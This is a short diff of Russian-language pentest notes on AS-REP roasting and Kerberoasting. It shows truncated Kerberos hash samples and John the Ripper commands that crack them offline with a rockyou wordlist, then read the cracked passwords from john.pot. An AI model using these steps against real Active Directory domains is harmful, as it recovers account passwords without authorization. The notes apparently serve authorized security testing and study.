@@ -1,8 +1,19 @@
 Asreproasting
-собираем хэши все в один файл kerberoast.txt
+собираем хэши все в один файл asreproast.txt
 $krb5asrep$23$PUPKIN@domain.LOCAL:986b6b18122c49016189777680dec662$d70486ed9fcad29ddf9152b6afea0e6f122c3301ae5c8f8a......
 $krb5asrep$23$SIDOROV@domain.LOCAL:557314c1fd9e33ba6f0087d767d0559d$012ec2151bacfc0197e045c9f4591.....
 .....
 
 john --format=krb5asrep --wordlist=/home/user/Desktop/rockyou2024_printable_8-40.txt asreproast.txt
 ждем
+
+
+Kerberoasting 
+собираем хэши все в один файл kerberoast.txt
+
+$krb5tgs$23$*srv$domain.LOCAL$domain.local/tgs_srv*$73ce6a13722cc5501d4506e7c3
+$krb5tgs$23$*srv1$domain.LOCAL$domain.local/tgs_srv*$73ce6a13722cc5501d4506e7c3
+....
+john --format=krb5tgs --wordlist=/home/user/Desktop/rockyou2024_printable_8-40.txt kerberoast.txt
+ждем
+также после сканирования результаты можно посмотреть cat ~/.john/john.pot
